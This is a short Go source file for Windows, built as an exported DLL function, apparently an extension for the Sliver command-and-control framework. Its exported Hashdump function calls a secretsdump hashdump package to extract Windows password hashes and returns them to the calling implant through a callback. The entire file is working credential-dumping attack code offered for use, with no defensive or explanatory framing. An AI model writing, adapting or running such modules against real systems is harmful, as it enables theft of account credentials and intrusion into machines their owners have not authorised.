//go:build windows

package main

import (
	"C"

	"syscall"
	"unsafe"
)
import "github.com/sliverarmory/secretsdump/pkg/hashdump"

func sendOutput(data string, callback uintptr) {
	outDataPtr, err := syscall.BytePtrFromString(data)
	if err != nil {
		return
	}
	// Send data back
	syscall.SyscallN(callback, uintptr(unsafe.Pointer(outDataPtr)), uintptr(len(data)))
}

func sendError(err error, callback uintptr) {
	sendOutput(err.Error(), callback)
}

//export Hashdump
func Hashdump(data uintptr, dataLen uintptr, callback uintptr) uintptr {
	result, err := hashdump.Hashdump()
	if err != nil {
		sendError(err, callback)
		return 1
	}
	sendOutput(result, callback)
	return 0
}

func main() {}
